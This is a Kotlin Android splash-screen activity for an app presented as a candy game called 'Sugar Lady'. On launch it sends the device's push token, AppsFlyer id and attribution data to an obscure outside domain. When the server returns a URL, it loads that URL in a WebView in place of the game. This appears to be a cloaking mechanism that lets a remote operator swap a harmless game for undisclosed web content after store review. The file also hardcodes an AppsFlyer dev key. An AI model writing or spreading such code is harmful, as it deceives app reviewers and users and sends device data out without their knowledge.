package com.candyworld.sugarlady

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.firebase.messaging.FirebaseMessaging
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.candyworld.sugarlady.databinding.ActivitySplashSugarLadyBinding
import com.candyworld.sugarlady.gameObjects.WVSugarLady
import com.candyworld.sugarlady.gameObjects.api.MainApi
import com.candyworld.sugarlady.gameObjects.api.ResponseCapy
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class SplashSugarLadyActivity : AppCompatActivity() {
    private val binding by lazy {
        ActivitySplashSugarLadyBinding.inflate(layoutInflater)
    }
    val devKey = "N6uL5TSEJKyPGxXn2BBTiH"

    private val sharedPreferences by lazy {
        getSharedPreferences("sugar", MODE_PRIVATE)
    }

    private val token = MutableLiveData("")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)
        enableEdgeToEdge()

        AppsFlyerLib.getInstance().init(devKey, getAppsListener(), this)
        AppsFlyerLib.getInstance().start(this)

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                token.value = task.result ?: ""
            }
        }

    }

    fun getAppsListener(): AppsFlyerConversionListener {
        return object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                if (sharedPreferences.getString("statistic", "") != "") {
                    startActivity(Intent(this@SplashSugarLadyActivity, WVSugarLady::class.java))
                    overridePendingTransition(0, 0)
                    finish()
                } else p0?.let { mainLogic(it) }

            }

            override fun onConversionDataFail(p0: String?) {
                if (sharedPreferences.getString("statistic", "") != "") {
                    startActivity(Intent(this@SplashSugarLadyActivity, WVSugarLady::class.java))
                    overridePendingTransition(0, 0)
                    finish()
                }
                mainLogic(mutableMapOf("appsflyer_dada_fail" to (p0?: "")))
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
                TODO("Not yet implemented")
            }

            override fun onAttributionFailure(p0: String?) {
                TODO("Not yet implemented")
            }

        }
    }

    private fun mainLogic(p0: MutableMap<String, Any>){
        val retrofit = Retrofit.Builder()
            .baseUrl("https://sites.google.com/view/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val mainApi = retrofit.create(MainApi::class.java)
        binding.apply {
            CoroutineScope(Dispatchers.IO).launch {
                val jsonObject = JsonObject().apply {
                    addProperty("app_id", "com.candyworld.sugarlady")
                    addProperty(
                        "device_token",token.value
                    )
                    addProperty("appsflyer_id", AppsFlyerLib.getInstance()
                        .getAppsFlyerUID(this@SplashSugarLadyActivity))
                    add("appsflyer_data", Gson().toJsonTree(p0))
                }
                lifecycleScope.launch {
                    try {

                        val response = mainApi.sendCampLink(
                            "https://sudofrise.space",
                            jsonObject
                        )
                        response.enqueue(object : Callback<ResponseCapy> {
                            override fun onResponse(
                                call: Call<ResponseCapy>,
                                response: Response<ResponseCapy>
                            ) {
                                if (response.isSuccessful && response.code() == 200) {
                                    val responseBody = response.body()
                                    val accessToken = responseBody?.url
                                    if (accessToken != null) {
                                        val intent = Intent(
                                            this@SplashSugarLadyActivity,
                                            WVSugarLady::class.java
                                        )
                                        intent.putExtra("statistic",accessToken)
                                        startActivity(intent)
                                        overridePendingTransition(0, 0)
                                        finish()

                                    } else
                                        startActivity(
                                            Intent(
                                                this@SplashSugarLadyActivity,
                                                MainMenuActivity::class.java
                                            )
                                        )
                                } else {
                                    startActivity(
                                        Intent(
                                            this@SplashSugarLadyActivity,
                                            MainMenuActivity::class.java
                                        )
                                    )
                                    overridePendingTransition(0, 0)
                                    finish()
                                }
                            }

                            override fun onFailure(
                                call: Call<ResponseCapy>,
                                t: Throwable
                            ) {
                                startActivity(
                                    Intent(
                                        this@SplashSugarLadyActivity,
                                        MainMenuActivity::class.java
                                    )
                                )
                                overridePendingTransition(0, 0)
                                finish()
                            }

                        })

                    } catch (e: Exception) {
                        println("Exception JWT: $e")
                        startActivity(
                            Intent(
                                this@SplashSugarLadyActivity,
                                MainMenuActivity::class.java
                            )
                        )
                        overridePendingTransition(0, 0)
                        finish()
                    }
                }
            }
        }
    }
}